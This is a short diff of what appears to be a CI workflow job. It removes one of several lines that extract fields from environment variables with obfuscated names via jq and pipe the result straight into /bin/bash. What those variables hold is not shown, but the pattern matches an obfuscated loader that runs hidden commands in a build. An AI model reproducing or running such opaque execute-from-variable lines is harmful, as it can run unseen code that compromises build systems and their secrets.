@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$hc500" | jq -r .wb6098 | /bin/bash
           echo $vdrf5825 | jq -r .edb1 | /bin/bash
           echo $vf52085 | jq -r .oep57 | /bin/bash
-          printf '%s' "$iti33" | jq -r .o1249 | /bin/bash
           printf '%s' "$lhsa1677" | jq -r .zqki6062 | /bin/bash
 
       - name: Persist output
